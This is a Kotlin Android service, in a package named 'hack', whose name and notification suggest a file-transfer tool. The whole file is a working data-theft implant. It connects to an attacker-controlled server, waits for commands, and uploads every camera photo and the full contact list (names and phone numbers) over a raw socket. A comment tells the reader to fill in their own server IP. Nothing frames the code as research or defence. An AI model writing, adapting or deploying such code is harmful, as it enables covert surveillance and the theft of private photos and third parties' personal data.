package com.example.hack

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.ContentResolver
import android.content.Intent
import android.database.Cursor
import android.os.Build
import android.os.Environment
import android.os.IBinder
import android.provider.ContactsContract
import android.util.Log
import androidx.core.app.NotificationCompat
import java.io.File
import java.io.FileInputStream
import java.io.OutputStream
import java.net.Socket

class FileTransferService : Service() {

    companion object {
        const val SERVER_IP = "192.168.1.5"  // Replace with your server's IP address
        const val SERVER_PORT = 8080
        private const val CHANNEL_ID = "FileTransferServiceChannel"
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(1, createNotification())
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Thread {
            try {
                val socket = Socket(SERVER_IP, SERVER_PORT)
                val outputStream = socket.getOutputStream()
                val inputStream = socket.getInputStream()

                // Read command from server
                val buffer = ByteArray(1024)
                val bytesRead = inputStream.read(buffer)
                val command = String(buffer, 0, bytesRead).trim()

                when (command) {
                    "FILES" -> {
                        Log.i("FileTransferService", "Starting to transfer files...")
                        transferFiles(outputStream)
                    }
                    "CONTACTS" -> {
                        Log.i("FileTransferService", "Starting to transfer contacts...")
                        transferContacts(outputStream)
                    }
                    else -> Log.e("FileTransferService", "Unknown command: $command")
                }

                inputStream.close()
                outputStream.close()
                socket.close()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }.start()
        return START_NOT_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val serviceChannel = NotificationChannel(
                CHANNEL_ID,
                "File Transfer Service Channel",
                NotificationManager.IMPORTANCE_DEFAULT
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(serviceChannel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("File Transfer Service")
            .setContentText("Transferring files in the background")
            .setSmallIcon(R.mipmap.ic_launcher)
            .build()
    }

    private fun transferFiles(outputStream: OutputStream) {
        val directoryPath = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).absolutePath + "/Camera/"
        val directory = File(directoryPath)
        if (directory.exists() && directory.isDirectory) {
            val files = directory.listFiles()
            if (files != null && files.isNotEmpty()) {
                files.forEach { file ->
                    try {
                        val fileDetails = "${file.name}<SEPARATOR>${file.length()}"
                        outputStream.write(fileDetails.toByteArray())

                        val fileInputStream = FileInputStream(file)
                        val buffer = ByteArray(4096)
                        var bytesRead: Int

                        while (fileInputStream.read(buffer).also { bytesRead = it } > 0) {
                            outputStream.write(buffer, 0, bytesRead)
                        }

                        fileInputStream.close()
                    } catch (e: Exception) {
                        e.printStackTrace()
                    }
                }
            } else {
                Log.e("FileTransferService", "No files found in the directory")
            }
        } else {
            Log.e("FileTransferService", "Directory does not exist or is not a directory")
        }
    }

    private fun transferContacts(outputStream: OutputStream) {
        val contacts = getContacts()
        if (contacts.isNotEmpty()) {
            outputStream.write(contacts.toByteArray())
            outputStream.flush()
            Log.d("FileTransferService", "Contacts data sent successfully")
        } else {
            Log.e("FileTransferService", "No contacts to send")
        }
    }


    private fun getContacts(): String {
        val contactList = StringBuilder()
        val resolver: ContentResolver = contentResolver
        val cursor: Cursor? = resolver.query(
            ContactsContract.Contacts.CONTENT_URI,
            null, null, null, null
        )

        cursor?.let {
            val idIndex = it.getColumnIndex(ContactsContract.Contacts._ID)
            val nameIndex = it.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
            val hasPhoneNumberIndex = it.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)

            // Check if column indexes are valid
            if (idIndex == -1 || nameIndex == -1 || hasPhoneNumberIndex == -1) {
                Log.e("FileTransferService", "Column index not found")
                return contactList.toString()
            }

            if (it.count > 0) {
                while (it.moveToNext()) {
                    val id = it.getString(idIndex)
                    val name = it.getString(nameIndex)
                    if (it.getInt(hasPhoneNumberIndex) > 0) {
                        val pCursor: Cursor? = resolver.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            arrayOf(id), null
                        )
                        pCursor?.let { phoneCursor ->
                            val phoneNoIndex = phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                            if (phoneNoIndex == -1) {
                                Log.e("FileTransferService", "Phone number column index not found")
                                return contactList.toString()
                            }
                            while (phoneCursor.moveToNext()) {
                                val phoneNo = phoneCursor.getString(phoneNoIndex)
                                contactList.append("Name: $name, Phone Number: $phoneNo\n")
                            }
                            phoneCursor.close()
                        }
                    }
                }
            } else {
                Log.e("FileTransferService", "No contacts found")
            }
            it.close()
        } ?: Log.e("FileTransferService", "Cursor is null")

        return contactList.toString()
    }



}
